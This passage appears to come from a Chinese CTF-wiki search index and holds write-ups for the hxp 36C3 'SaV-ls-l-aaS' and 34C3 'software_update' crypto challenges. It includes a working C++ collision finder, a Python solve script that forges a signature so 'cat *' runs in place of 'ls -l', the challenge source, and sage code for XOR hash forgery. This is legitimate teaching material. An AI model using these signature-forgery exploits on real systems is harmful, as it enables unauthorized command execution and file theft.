'\\\\u000e\\t\\\\u001d\\\\ufffd\\\\u0012\\\\ufffd.\\\\ufffd\\\\ufffd\\\\ufffd?-\\\\ufffdKC\\\\ufffd\\\\u0005\\\\ufffd@\\\\ufffd' >>> from hashlib import * >>> sha1 ( '172.17.0.1|ls -l' ) .digest () '\\x0e\\t\\x1d\\xbd\\x12\\x90.\\xca\\xf0\\xd9?-\\x98KC\\xeb\\x05\\xa1@\\xd1' \u7531\u4e8e go \u7684 json \u7f16\u7801\uff0c\u5f88\u591a\u4e0d\u53ef\u89c1\u5b57\u7b26\u90fd\u88ab\u8f6c\u4e3a\u4e86 U+fffd \uff0c\u4e22\u5931\u4e86\u5f88\u591a\u4fe1\u606f\u3002 \u518d\u7ecf\u8fc7 php \u63a5\u53e3\u7684\u63a5\u6536\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u7ed3\u679c\uff1a $d = json_decode(file_get_contents('php://input'), JSON_THROW_ON_ERROR); var_dump(file_get_contents('php://input')); var_dump($d); var_dump(bin2hex($d)); \u7ed3\u679c\uff1a string(89) \"\"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\" \" string(38) \"\u000e \u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd\" string(76) \"0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd\" \"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\" oops, hsm is jsonless? U+fffd \u53d8\u6210\u4e86 \\xef\\xbf\\xbd \u3002\u6240\u4ee5\u7531\u4e8e go \u7684 json \u7f16\u7801\u95ee\u9898\uff0c\u4e22\u5931\u4e86\u5f88\u591a\u4fe1\u606f\uff0c\u9020\u6210\u4e86 md5 \u524d\u7684\u6570\u636e\u6709\u5f88\u591a\u76f8\u540c\u5b57\u7b26\u3002\u5f53\u65f6\u505a\u9898\u65f6\u5f80\u4e0b\u5e76\u6ca1\u6709\u7ec6\u60f3\uff0c\u5f97\u5230 n \u540e\u603b\u662f\u60f3\u6784\u9020\u51fa\u4efb\u610f\u547d\u4ee4\u7684\u7b7e\u540d\uff0c\u4e5f\u5f88\u7591\u60d1\u5982\u679c\u6784\u9020\u51fa\u5c82\u4e0d\u662f\u8fd9\u79cd\u7b7e\u540d\u5c31\u4e0d\u5b89\u5168\u4e86\uff1f\u5176\u5b9e\u662f\u65e0\u6cd5\u5f97\u5230\u7684\u3002 \u6b63\u89e3\u662f go \u7684\u8fd9\u79cd\u95ee\u9898 \uff0c\u4e3a\u78b0\u649e\u521b\u9020\u4e86\u6761\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u78b0\u649e\u51fa\u5728\u8fd9\u79cd\u7f16\u7801\u60c5\u51b5\u4e0b\u4e0e ls -l \u6709\u76f8\u540c\u7ed3\u679c\u7684 cat * \u6b64\u7c7b\u547d\u4ee4\u3002\u4f46\u662f\u95ee\u9898\u662f\u6211\u4eec\u9700\u8981\u975e\u5e38\u5927\u91cf ip \u6765\u63d0\u4f9b\u78b0\u649e\u7684\u6570\u636e\u3002 \u53ef\u4ee5\u53d1\u73b0\uff0cgo \u53d6 ip \u7684\u65f6\u5019\uff0c\u662f\u5148\u7528 net.ParseIP \u89e3\u6790\u4e86 ip\uff0c\u6211\u4eec\u5728 ip \u6bcf\u4e2a\u6570\u5b57\u524d\u9762\u52a0 0 \uff0c\u89e3\u6790\u540e\u8fd8\u662f\u539f\u6765\u7684 ip \u7ed3\u679c\uff0c\u6bcf\u4e2a\u6570\u5b57\u6700\u591a\u6dfb\u52a0 256 \u4e2a 0\uff0c\u56db\u4e2a\u6570\u5b57\u5c31\u5df2\u7ecf\u4ea7\u751f\u4e86 2^32 \u79cd\u4e0d\u540c\u7684\u7ec4\u5408\uff0c\u8db3\u4ee5\u78b0\u649e\u51fa ls -l \u4e0e cat * \u4e4b\u95f4\u7684\u51b2\u7a81\u3002 \u5b98\u65b9\u9898\u89e3\u7684 c++ \u78b0\u649e\u811a\u672c\u6211\u672c\u5730\u7f16\u8bd1\u7684\u6709\u70b9\u95ee\u9898\uff0c\u52a0\u4e86\u4e00\u4e9b\u5f15\u5165\u7684\u5934\u6587\u4ef6\uff1a // g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt #include <cassert> #include <iomanip> #include <string> #include <sstream> #include <iostream> #include <functional> #include <random> #include <unordered_map> #include <algorithm> #include <thread> #include <atomic> #include <mutex> #include <array> #include <openssl/sha.h> const unsigned num_threads = std :: thread :: hardware_concurrency (); static std :: string hash ( std :: string const & s ) { SHA_CTX ctx ; if ( ! SHA1_Init ( & ctx )) throw ; if ( ! SHA1_Update ( & ctx , s . data (), s . length ())) throw ; std :: string d ( SHA_DIGEST_LENGTH , 0 ); if ( ! SHA1_Final (( uint8_t * ) & d [ 0 ], & ctx )) throw ; return d ; } static std :: u32string kapot ( std :: string const & s ) { std :: u32string r ( s . size (), 0 ); size_t o = 0 ; for ( size_t i = 0 ; i < s . length (); ) { auto T = []( uint8_t c ) { return ( c < 0x80 ) ? 1 /* ASCII */ : ( c & 0xc0 ) == 0x80 ? 0 /* continuation */ : ( c & 0xe0 ) == 0xc0 ? 2 /* 2-byte chunk */ : ( c & 0xf0 ) == 0xe0 ? 3 /* 3-byte chunk */ : ( c & 0xf8 ) == 0xf0 ? 4 /* 4-byte chunk */ : -1 ; }; uint32_t c = s [ i ++ ]; auto cont = [ & ]() { c = ( c << 6 ) | ( s [ i ++ ] & 0x3f ); }; switch ( T ( c )) { case -1 : case 0 : invalid : c = 0xfffd ; /* fall through */ case 1 : valid : r [ o ++ ] = c ; break ; case 2 : if ( c &= 0x1f , i + 0 >= s . size () || T ( s [ i + 0 ])) goto invalid ; goto one ; case 3 : if ( c &= 0x1f , i + 1 >= s . size () || T ( s [ i + 0 ]) || T ( s [ i + 1 ])) goto invalid ; goto two ; case 4 : if ( c &= 0x1f , i + 2 >= s . size () || T ( s [ i + 0 ]) || T ( s [ i + 1 ]) || T ( s [ i + 2 ])) goto invalid ; cont (); two : cont (); one : cont (); goto valid ; } } r . resize ( o ); return r ; } std :: atomic < uint64_t > hcount = 0 , kcount = 0 ; typedef std :: unordered_map < std :: u32string , std :: string > tab_t ; tab_t tab0 , tab1 ; std :: mutex mtx ; std :: array < uint8_t , 4 > ip ; std :: string cmd0 , cmd1 ; class stuffer_t { private : std :: array < size_t , 4 > cnts ; size_t step ; std :: string cmd ; public : stuffer_t ( size_t t , size_t s , std :: string c ) : cnts { t }, step ( s ), cmd ( c ) {} std :: string operator ()() { //XXX this is by far not the most efficient way of doing this, but yeah if ( ++ cnts [ 3 ] >= cnts [ 0 ]) { cnts [ 3 ] = 0 ; if ( ++ cnts [ 2 ] >= cnts [ 0 ]) { cnts [ 2 ] = 0 ; if ( ++ cnts [ 1 ] >= cnts [ 0 ]) { cnts [ 1 ] = 0 ; cnts [ 0 ] += step ; } } } std :: stringstream o ; for ( size_t i = 0 ; i < 4 ; ++ i ) o << ( i ? \".\" : \"\" ) << std :: string ( cnts [ i ], '0' ) << ( unsigned ) ip [ i ]; o << \"|\" << cmd ; return o . str (); } }; void go ( size_t tid ) { //XXX tid stuff is a hack, but YOLO bool one = tid & 1 ; stuffer_t next ( tid >> 1 , ( num_threads + 1 ) >> 1 , one ? cmd1 : cmd0 ); tab_t & mytab = one ? tab1 : tab0 ; tab_t & thtab = one ? tab0 : tab1 ; uint64_t myhcount = 0 , mykcount = 0 ; while ( 1 ) { std :: string r = next (); { ++ myhcount ; auto h = hash ( r ); if (( h . size () + 3 ) / 4 < ( size_t ) std :: count_if ( h . begin (), h . end (), []( unsigned char c ) { return c < 0x80 ; })) continue ; ++ mykcount ; auto k = kapot ( h ); if ( k . size () > 3 + ( size_t ) std :: count ( k . begin (), k . end (), 0xfffd )) continue ; std :: lock_guard < std :: mutex > lck ( mtx ); hcount += myhcount , myhcount = 0 ; kcount += mykcount , mykcount = 0 ; if ( thtab . find ( k ) != thtab . end ()) { mytab [ k ] = r ; std :: cerr << \" \\r\\x1b [K\" << \" \\x1b [32m\" ; std :: cout << tab0 [ k ] << std :: endl << tab1 [ k ] << std :: endl ; std :: cerr << \" \\x1b [0m\" ; std :: cerr << std :: hex ; bool first = true ; for ( uint32_t c : k ) std :: cerr << ( first ? first = false , \"\" : \" \" ) << c ; std :: cerr << std :: endl ; std :: cerr << std :: dec << \"hash count: \\x1b [35m\" << hcount << \" \\x1b [0m\" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( hcount | 1 ) / log ( 2 ); std :: cerr << \" (2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m\" << \")\" << std :: endl ; } std :: cerr << \"kapot count: \" << \" \\x1b [35m\" << kcount << \" \\x1b [0m\" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( kcount | 1 ) / log ( 2 ); std :: cerr << \" (2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m)\" << std :: endl ; } std :: cerr << \"table sizes: \\x1b [35m\" << tab0 . size () << \" \\x1b [0m \\x1b [35m\" << tab1 . size () << \" \\x1b [0m\" << std :: endl ; exit ( 0 ); } if ( mytab . size () < ( 1 << 20 )) mytab [ k ] = r ; } hcount += myhcount ; kcount += mykcount ; } } void status () { while ( 1 ) { { std :: lock_guard < std :: mutex > lck ( mtx ); std :: cerr << \" \\r\\x1b [K\" ; std :: cerr << \"hash count: \\x1b [35m\" << std :: setw ( 12 ) << hcount << \" \\x1b [0m \" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( hcount | 1 ) / log ( 2 ); std :: cerr << \"(2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m) | \" ; } std :: cerr << \"kapot count: \\x1b [35m\" << std :: setw ( 12 ) << kcount << \" \\x1b [0m \" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( kcount | 1 ) / log ( 2 ); std :: cerr << \"(2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m) | \" ; } std :: cerr << \"tables: \\x1b [35m\" << std :: setw ( 9 ) << tab0 . size () << \" \" << std :: setw ( 9 ) << tab1 . size () << \" \\x1b [0m \" << std :: flush ; } std :: this_thread :: sleep_for ( std :: chrono :: milliseconds ( 100 )); } } int main ( int argc , char ** argv ) { if ( argc < 2 ) { std :: cerr << \" \\x1b [31mneed IPv4 in argv[1] \\x1b [0m\" << std :: endl ; exit ( 1 ); } { std :: stringstream ss ( argv [ 1 ]); for ( auto & v : ip ) { std :: string s ; std :: getline ( ss , s , '.' ); int n = std :: atoi ( s . c_str ()); if ( n < std :: numeric_limits < uint8_t >:: min () || n > std :: numeric_limits < uint8_t >:: max ()) goto bad_ip ; v = n ; } if ( ! ss ) { bad_ip : std :: cerr << \" \\x1b [31mbad IPv4 given? \\x1b [0m\" << std :: endl ; exit ( 2 ); } } if ( argc < 4 ) { std :: cerr << \" \\x1b [31mneed commands in argv[2] and argv[3] \\x1b [0m\" << std :: endl ; exit ( 2 ); } cmd0 = argv [ 2 ]; cmd1 = argv [ 3 ]; std :: thread status_thread ( status ); std :: vector < std :: thread > ts ; for ( unsigned i = 0 ; i < num_threads ; ++ i ) ts . push_back ( std :: thread ( go , i )); for ( auto & t : ts ) t . join (); } \u7f16\u8bd1\u53ef\u80fd\u4f1a\u627e\u4e0d\u5230 lcrypto \uff0c\u7f16\u8bd1\u547d\u4ee4\u52a0\u4e0a lcrypto \u8def\u5f84\uff08\u6211\u672c\u5730\u662f /usr/local/opt/openssl/lib\uff09 g++ -std = c++17 -march = native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/local/opt/openssl/lib \u4e0e go \u4ea4\u4e92\u7684\u811a\u672c\uff1a #!/usr/bin/env python3 import sys , requests , subprocess benign_cmd = 'ls -l' exploit_cmd = 'cat *' ip , port = sys . argv [ 1 ], sys . argv [ 2 ] url = 'http:// {} : {} ' . format ( ip , port ) my_ip = requests . get ( url + '/ip' ) . text print ( '[+] IP: ' + my_ip ) o = subprocess . check_output ([ './gewalt' , my_ip , benign_cmd , exploit_cmd ]) print ( '[+] gewalt:' + o . decode ()) payload = {} for l in o . decode () . splitlines (): ip , cmd = l . split ( '|' ) payload [ 'benign' if cmd == benign_cmd else 'pwn' ] = ip , cmd print ( payload ) sig = requests . post ( url + '/sign' , data = { 'ip' : payload [ 'benign' ][ 0 ], 'cmd' : payload [ 'benign' ][ 1 ]}) . text print ( '[+] sig: ' + sig ) r = requests . post ( url + '/exec' , data = { 'signature' : sig [: 172 ] + payload [ 'pwn' ][ 0 ] + '|' + payload [ 'pwn' ][ 1 ]}) print ( r . text ) \u2699 \ue0b0 SaV-ls-l-aaS \ue0b0 python solve.py 127 .0.0.1 60601 [ + ] IP: 172 .17.0.1 fffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd hash count: 168104875 ( 2 ^27.32 ) kapot count: 3477222 ( 2 ^21.73 ) table sizes: 8745 8856 [ + ] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 | ls -l 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172 .17.000000000000000000000000.0000000000000000000000000000000000000001 | cat * { 'pwn' : ( u '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001' , u 'cat *' ) , 'benign' : ( u '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001' , u 'ls -l' )} [ + ] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY = 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172 .000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 | ls -l hxp { FLAG } \u53c2\u8003\uff1a https://ctftime.org/writeup/17966","title":"\u7efc\u5408\u9898\u76ee"},{"location":"crypto/hash/complex/#_1","text":"","title":"\u7efc\u5408\u9898\u76ee"},{"location":"crypto/hash/complex/#2017-34c3-software_update","text":"\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e \u5f02\u6216 \u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002 \u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def \u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002 \u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528 \u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c \uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b \u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002 \u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002 \u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002 \u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ \u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b # generage the base of <{0,1},F^256,xor,*> def gen_gf2_256_base (): v = VectorSpace ( GF ( 2 ), 256 ) tmphash = compute_file_hash ( \"0.py\" , \"\" ) tmphash_bin = hash2bin ( tmphash ) base = [ tmphash_bin ] filelist = [ '0.py' ] print base s = v . subspace ( base ) dim = s . dimension () cnt = 1 while dim != 256 : tmpfile = str ( cnt ) + \".py\" tmphash = compute_file_hash ( tmpfile , \"\" ) tmphash_bin = hash2bin ( tmphash ) old_dim = dim s = v . subspace ( base + [ tmphash_bin ]) dim = s . dimension () if dim > old_dim : base += [ tmphash_bin ] filelist . append ( tmpfile ) print ( \"dimension \" + str ( s . dimension ())) cnt += 1 print ( cnt ) m = matrix ( GF ( 2 ), 256 , 256 , base ) m = m . transpose () return m , filelist \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003 exp.py \u3002 \u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa !!!!come here!!!! \u5b57\u773c\uff0c\u5982\u4e0b \u279c software_update git: ( master ) python3 installer.py now.zip Preparing to copy data... !!!!come here!!!! Software update installed successfully. \u53c2\u8003\u6587\u732e https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py","title":"2017 34c3 Software_update"},{"location":"crypto/hash/complex/#2019-36c3-sav-ls-l-aas","text":"\u8fd9\u4e2a\u9898\u7684\u5206\u7c7b\u662f Crypto&Web\uff0c\u634b\u4e00\u4e0b\u6d41\u7a0b\uff1a 60601\u7aef\u53e3\u5f00\u7740\u4e00\u4e2aWeb\u670d\u52a1\uff0c\u9898\u76ee\u63cf\u8ff0\u7ed9\u4e86\u8fde\u63a5\u65b9\u6cd5\uff1a url = 'http://78.47.240.226:60601' && ip = $( curl -s \" $url /ip\" ) && sig = $( curl -s -d \"cmd=ls -l&ip= $ip \" \" $url /sign\" ) && curl --data-urlencode \"signature= $sig \" \" $url /exec\" \u53ef\u4ee5\u770b\u5230\uff0c\u5148\u662f\u8bbf\u95ee /ip \u5f97\u5230 ip\uff0c\u518d\u5411 /sign post \u8fc7\u53bb ip \u548c\u6211\u4eec\u8981\u6267\u884c\u7684\u547d\u4ee4\uff0c\u5f97\u5230\u7b7e\u540d\uff0c\u6700\u540e\u5411 /exec post signature \u6765\u6267\u884c\u547d\u4ee4\u3002\u6211\u4eec\u6267\u884c\u8fd9\u4e00\u884c\u53ef\u4ee5\u53d1\u73b0\u56de\u663e\u4e86 ls -l \u6267\u884c\u7684\u7ed3\u679c\uff0c\u53d1\u73b0\u6709\u4e2a flag.txt\u3002 \u770b\u6e90\u7801\uff0cWeb \u670d\u52a1\u662f\u7531 go \u8d77\u7684\uff1a package main import ( \"bytes\" \"crypto/sha1\" \"encoding/json\" \"fmt\" \"io\" \"io/ioutil\" \"log\" \"net\" \"net/http\" \"strings\" \"time\" ) func main () { m := http . NewServeMux () m . HandleFunc ( \"/ip\" , func ( w http . ResponseWriter , r * http . Request ) { ip , _ , err := net . SplitHostPort ( r . RemoteAddr ) if err != nil { return } fmt . Fprint ( w , ip ) }) m . HandleFunc ( \"/sign\" , func ( w http . ResponseWriter , r * http . Request ) { ip , _ , err := net . SplitHostPort ( r . RemoteAddr ) if err != nil { return } remoteAddr := net . ParseIP ( ip ) if remoteAddr == nil { return } ip = r . PostFormValue ( \"ip\" ) signIP := net . ParseIP ( ip ) if signIP == nil || ! signIP . Equal ( remoteAddr ) { fmt . Fprintln ( w , \"lol, not ip :>\" ) return } cmd := r . PostFormValue ( \"cmd\" ) if cmd != \"ls -l\" { fmt . Fprintln ( w , \"lol, nope :>\" ) return } msg := ip + \"|\" + cmd digest := sha1 . Sum ([] byte ( msg )) b := new ( bytes . Buffer ) err = json . NewEncoder ( b ). Encode ( string ( digest [:])) if err != nil { return } resp , err := http . Post ( \"http://127.0.0.1/index.php?action=sign\" , \"application/json; charset=utf-8\" , b ) if err != nil || resp . StatusCode != 200 { fmt . Fprintln ( w , \"oops, hsm is down\" ) return } body , err := ioutil . ReadAll ( resp . Body ) if err != nil { fmt . Fprintln ( w , \"oops, hsm is bodyless?\" ) return } var signature string err = json . Unmarshal ( body , & signature ) if err != nil { fmt . Fprintln ( w , \"oops, hsm is jsonless?\" ) return } fmt . Fprint ( w , signature + msg ) }) m . HandleFunc ( \"/exec\" , func ( w http . ResponseWriter , r * http . Request ) { ip , _ , err := net . SplitHostPort ( r . RemoteAddr ) if err != nil { return } remoteAddr := net . ParseIP ( ip ) if remoteAddr == nil { return } signature := r . PostFormValue ( \"signature\" ) digest := sha1 . Sum ([] byte ( signature [ 172 :])) b := new ( bytes . Buffer ) err = json . NewEncoder ( b ). Encode ( signature [: 172 ] + string ( digest [:])) if err != nil { fmt . Fprintln ( w , \"oops, json encode\" ) return } resp , err := http . Post ( \"http://127.0.0.1/index.php?action=verify\" , \"application/json; charset=utf-8\" , b ) if err != nil || resp . StatusCode != 200 { fmt . Fprintln ( w , \"oops, hsm is down?\" ) return } body , err := ioutil . ReadAll ( resp . Body ) if err != nil { fmt . Fprintln ( w , \"oops, hsm is bodyless?\" ) return } var valid bool err = json . Unmarshal ( body , & valid ) if err != nil { fmt . Fprintln ( w , \"oops, json unmarshal\" ) return } if valid { t := strings . Split ( signature [ 172 :], \"|\" ) if len ( t ) != 2 { fmt . Fprintln ( w , \"oops, split\" ) } signIP := net . ParseIP ( t [ 0 ]) if signIP == nil || ! signIP . Equal ( remoteAddr ) { fmt . Fprintln ( w , \"lol, not ip :>\" ) return } conn , err := net . DialTimeout ( \"tcp\" , \"127.0.0.1:1024\" , 1 * time . Second ) if err != nil { fmt . Fprintln ( w , \"oops, dial\" ) return } fmt . Fprintf ( conn , t [ 1 ] + \"\\n\" ) conn .( * net . TCPConn ). CloseWrite () io . Copy ( w , conn ) } }) s := & http . Server { Addr : \":60601\" , Handler : m , ReadTimeout : 5 * time . Second , WriteTimeout : 5 * time . Second , MaxHeaderBytes : 1 << 20 , } log . Fatal ( s . ListenAndServe ()) } \u4ee3\u7801\u5f88\u5bb9\u6613\u770b\uff0c\u9650\u5236\u4e86 cmd \u53ea\u80fd\u662f ls -l \uff0c\u5176\u4f59\u4e0d\u7ed9\u7b7e\u540d\uff0c\u770b\u6837\u5b50\u6211\u4eec\u662f\u8981\u4f2a\u9020\u5176\u4ed6\u547d\u4ee4\u7684\u7b7e\u540d\u6765\u8bfbflag\uff0c\u8fd9\u91cc\u6ce8\u610f\u5230\u7b7e\u540d\u548c\u9a8c\u7b7e\u7684\u8fc7\u7a0b\u662f\u4f20\u7ed9\u672c\u5730\u8d77\u7684\u4e00\u4e2a php \u6765\u5b8c\u6210\u7684\uff0c\u770b\u4e00\u4e0b\u8fd9\u90e8\u5206\u6e90\u7801\uff1a <?php define ( 'ALGO' , 'md5WithRSAEncryption' ); $d = json_decode ( file_get_contents ( 'php://input' ), JSON_THROW_ON_ERROR ); if ( $_GET [ 'action' ] === 'sign' ){ $pkeyid = openssl_pkey_get_private ( \"file:///var/www/private_key.pem\" ); openssl_sign ( $d , $signature , $pkeyid , ALGO ); echo json_encode ( base64_encode ( $signature )); openssl_free_key ( $pkeyid ); } elseif ( $_GET [ 'action' ] === 'verify' ) { $pkeyid = openssl_pkey_get_public ( \"file:///var/www/public_key.pem\" ); echo json_encode ( openssl_verify ( substr ( $d , 172 ), base64_decode ( substr ( $d , 0 , 172 )), $pkeyid , ALGO ) === 1 ); openssl_free_key ( $pkeyid ); } \u91c7\u7528\u7684\u662f md5WithRSAEncryption \u7684\u65b9\u5f0f\u7b7e\u540d\uff0c\u672c\u5730\u8bd5\u4e86\u4e00\u4e0b\uff0c\u662f\u628a\u6211\u4eec\u4f20\u5165\u7684 $d md5 \u540e\u8f6c\u4e3ahex\uff0c\u586b\u5145\u5230 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff003020300c06082a864886f70d020505000410 \u540e\u9762\uff0c\u7ec4\u6210\u6570\u5b57\u7136\u540e\u7528RSA\u7b7e\u540d\u3002 \u770b\u6837\u5b50\u6574\u4e2a\u903b\u8f91\u627e\u4e0d\u5230\u4e00\u70b9\u95ee\u9898\uff0c\u7528\u7684\u90fd\u662f\u6807\u51c6\u5e93\uff0c\u57fa\u672c\u65e0\u6cd5\u653b\u51fb\u3002\u6709\u4e2a\u601d\u8def\u662f\u901a\u8fc7\u4ee3\u7406\u66f4\u6362 ip\uff0c\u53ef\u4ee5\u62ff\u5230\u4e24\u4e2a ip|ls -l \u7684\u7b7e\u540d\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u62e5\u6709\u4e86\u4e24\u7ec4 RSA \u7684 m \u548c c\uff0c\u56e0\u4e3a\u9898\u76ee\u7ed9\u4e86 dockerfile \u7ed9\u4e86\u751f\u6210\u516c\u79c1\u94a5\u7684\u65b9\u6cd5\uff0c\u4f7f\u7528 openssl 